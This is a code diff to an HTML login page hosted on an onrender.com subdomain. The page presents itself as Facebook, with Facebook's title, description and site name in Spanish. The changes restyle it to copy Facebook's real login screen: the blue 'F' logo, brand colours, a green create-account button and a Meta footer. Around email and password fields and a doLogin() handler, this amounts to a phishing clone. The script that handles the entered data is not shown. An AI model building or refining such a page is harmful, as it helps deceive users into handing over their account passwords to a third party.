@@ -17,8 +17,6 @@
   <meta property="og:url" content="https://facebook-whet.onrender.com/" />
   <meta property="og:site_name" content="Facebook" />
   <meta property="og:locale" content="es_PE" />
-
-  <!-- Twitter Card -->
   <meta name="twitter:card" content="summary_large_image" />
   <meta name="twitter:title" content="Facebook - Inicia sesión o regístrate" />
   <meta name="twitter:description" content="Crea una cuenta o inicia sesión en Facebook. Conéctate con amigos, familiares y otras personas que conozcas." />
@@ -45,76 +43,99 @@
       flex-direction: column;
       align-items: center;
       justify-content: space-between;
-      padding: 64px 24px 36px;
+      padding: 48px 20px 32px;
+      background: #f0f2f5;
     }
 
     .top {
       width: 100%;
-      max-width: 420px;
+      max-width: 396px;
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 40px;
+      gap: 20px;
     }
 
-    /* Círculo amarillo con imagen del candado */
-    .lock-circle {
-      width: 96px;
-      height: 96px;
+    /* Idioma arriba */
+    .lang {
+      font-size: 15px;
+      color: #65676b;
+      margin-bottom: 4px;
+    }
+
+    /* Logo F */
+    .fb-logo {
+      width: 72px;
+      height: 72px;
       border-radius: 50%;
-      background: #f5c518;
+      background: #1877f2;
       display: flex;
       align-items: center;
       justify-content: center;
-      flex-shrink: 0;
       overflow: hidden;
+      flex-shrink: 0;
     }
 
-    .lock-circle img {
+    .fb-logo img {
       width: 100%;
       height: 100%;
       object-fit: cover;
       display: block;
     }
 
+    /* SVG F de fallback */
+    .fb-logo svg {
+      width: 44px;
+      height: 44px;
+      fill: #ffffff;
+    }
+
+    /* Formulario */
     .form {
       width: 100%;
+      background: #ffffff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+      padding: 20px 16px 28px;
       display: flex;
       flex-direction: column;
-      gap: 14px;
+      gap: 12px;
     }
 
     .input-field {
       width: 100%;
-      height: 58px;
-      border: 1.5px solid #dddfe2;
-      border-radius: 14px;
-      padding: 0 20px;
+      height: 52px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      padding: 0 16px;
       font-family: 'Roboto', sans-serif;
       font-size: 17px;
       color: #1c1e21;
       background: #ffffff;
       outline: none;
-      transition: border-color 0.2s;
+      transition: border-color 0.2s, box-shadow 0.2s;
       appearance: none;
       -webkit-appearance: none;
     }
 
-    .input-field::placeholder { color: #8a8d91; }
-    .input-field:focus { border-color: #1877f2; border-width: 2px; }
+    .input-field::placeholder { color: #90949c; }
+    .input-field:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px rgba(24,119,242,.2);
+    }
 
     .btn-login {
       width: 100%;
-      height: 56px;
+      height: 52px;
       background: #1877f2;
       color: #ffffff;
       border: none;
-      border-radius: 14px;
+      border-radius: 6px;
       font-family: 'Roboto', sans-serif;
-      font-size: 17px;
+      font-size: 20px;
       font-weight: 700;
       cursor: pointer;
-      transition: background 0.18s;
+      transition: background 0.15s;
       margin-top: 4px;
     }
     .btn-login:hover    { background: #166fe5; }
@@ -123,71 +144,103 @@
 
     .forgot {
       text-align: center;
-      font-size: 17px;
-      font-weight: 700;
-      color: #1c1e21;
-      margin-top: 6px;
-      cursor: pointer;
+      font-size: 14px;
+      color: #1877f2;
       text-decoration: none;
       display: block;
+      padding: 8px 0 4px;
     }
     .forgot:hover { text-decoration: underline; }
+
+    .divider {
+      border: none;
+      border-top: 1px solid #dadde1;
+      margin: 8px 0;
+    }
 
     .alert {
       display: none;
       background: #fff3cd;
       border: 1px solid #ffc107;
-      border-radius: 10px;
-      padding: 12px 16px;
+      border-radius: 6px;
+      padding: 10px 14px;
       font-size: 14px;
       color: #856404;
       text-align: center;
     }
     .alert.show { display: block; }
 
-    .bottom {
-      width: 100%;
-      max-width: 420px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 20px;
-    }
-
+    /* Botón crear cuenta */
     .btn-new {
-      width: 100%;
-      height: 56px;
-      background: transparent;
-      color: #1877f2;
-      border: 2px solid #1877f2;
-      border-radius: 14px;
+      display: block;
+      margin: 0 auto;
+      padding: 0 24px;
+      height: 52px;
+      background: #42b72a;
+      color: #ffffff;
+      border: none;
+      border-radius: 6px;
       font-family: 'Roboto', sans-serif;
       font-size: 17px;
       font-weight: 700;
       cursor: pointer;
-      transition: background 0.18s;
+      transition: background 0.15s;
+      white-space: nowrap;
     }
-    .btn-new:hover  { background: #e7f0fe; }
-    .btn-new:active { background: #d0e2fd; }
+    .btn-new:hover  { background: #36a420; }
+    .btn-new:active { background: #2d8f1a; }
 
-    .google-logo {
-      height: 32px;
-      object-fit: contain;
-      display: block;
+    /* Sección inferior */
+    .bottom {
+      width: 100%;
+      max-width: 396px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 24px;
+      padding-bottom: 8px;
     }
+
+    /* Meta logo */
+    .meta-logo {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #8a8d91;
+      font-size: 13px;
+    }
+
+    .meta-logo svg {
+      height: 18px;
+      fill: #8a8d91;
+    }
+
+    /* Links pie */
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 8px 12px;
+      font-size: 12px;
+      color: #8a8d91;
+    }
+
+    .footer-links a {
+      color: #8a8d91;
+      text-decoration: none;
+    }
+    .footer-links a:hover { text-decoration: underline; }
 
     @media (max-width: 360px) {
-      .page        { padding: 48px 18px 28px; }
-      .lock-circle { width: 80px; height: 80px; }
-      .input-field { height: 52px; font-size: 16px; }
-      .btn-login   { height: 52px; font-size: 16px; }
-      .btn-new     { height: 52px; font-size: 16px; }
-      .forgot      { font-size: 16px; }
+      .page { padding: 32px 16px 24px; }
+      .input-field { height: 48px; font-size: 16px; }
+      .btn-login   { height: 48px; font-size: 18px; }
+      .btn-new     { height: 48px; font-size: 16px; }
     }
 
     @media (min-width: 600px) {
-      .page { justify-content: center; gap: 60px; padding: 80px 24px 60px; }
-      .top  { gap: 44px; }
+      .page { justify-content: center; gap: 48px; padding: 60px 24px 40px; }
+      .top  { gap: 24px; }
     }
   </style>
 </head>
@@ -197,20 +250,41 @@
 
   <div class="top">
 
-    <div class="lock-circle">
-      <img src="/login/Candado.jpg" alt="Candado" />
+    <div class="lang">Español</div>
+
+    <!-- Logo F azul -->
+    <div class="fb-logo">
+      <img
+        src="/login/Candado.jpg"
+        alt="Facebook"
+        onerror="this.style.display='none'; this.nextElementSibling.style.display='block';"
+      />
+      <!-- SVG F de fallback -->
+      <svg style="display:none;" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+      </svg>
     </div>
 
+    <!-- Formulario -->
     <div class="form">
       <div class="alert" id="alert"></div>
 
-      <input class="input-field" type="email" id="email"
+      <input
+        class="input-field"
+        type="email"
+        id="email"
         placeholder="Celular o correo electrónico"
-        autocomplete="email" inputmode="email" />
+        autocomplete="email"
+        inputmode="email"
+      />
 
-      <input class="input-field" type="password" id="password"
+      <input
+        class="input-field"
+        type="password"
+        id="password"
         placeholder="Contraseña"
-        autocomplete="current-password" />
+        autocomplete="current-password"
+      />
 
       <button class="btn-login" id="btnLogin" onclick="doLogin()">
         Iniciar sesión
@@ -219,16 +293,37 @@
       <a class="forgot" href="#" onclick="forgotPassword(event)">
         ¿Olvidaste tu contraseña?
       </a>
+
+      <hr class="divider" />
+
+      <div style="display:flex; justify-content:center;">
+        <button class="btn-new" onclick="alert('Contacta al administrador para crear una cuenta.')">
+          Crear cuenta nueva
+        </button>
+      </div>
     </div>
+
   </div>
 
+  <!-- Parte inferior -->
   <div class="bottom">
-    <button class="btn-new" onclick="alert('Contacta al administrador para crear una cuenta.')">
-      Crear cuenta nueva
-    </button>
-    <img src="/login/google.jpg" alt="Google" class="google-logo" />
-  </div>
 
+    <!-- Logo Meta -->
+    <div class="meta-logo">
+      <svg viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
+        <path d="M2 18C2 9.163 9.163 2 18 2s16 7.163 16 16-7.163 16-16 16S2 26.837 2 18zm10.5-4.5c-1.381 0-2.5 1.794-2.5 4s1.119 4 2.5 4 2.5-1.794 2.5-4-1.119-4-2.5-4zm11 0c-1.381 0-2.5 1.794-2.5 4s1.119 4 2.5 4 2.5-1.794 2.5-4-1.119-4-2.5-4z"/>
+      </svg>
+      <span>Meta</span>
+    </div>
+
+    <!-- Links pie de página -->
+    <div class="footer-links">
+      <a href="#">Información</a>
+      <a href="#">Ayuda</a>
+      <a href="#">Más</a>
+    </div>
+
+  </div>
 </div>
 
 <script>
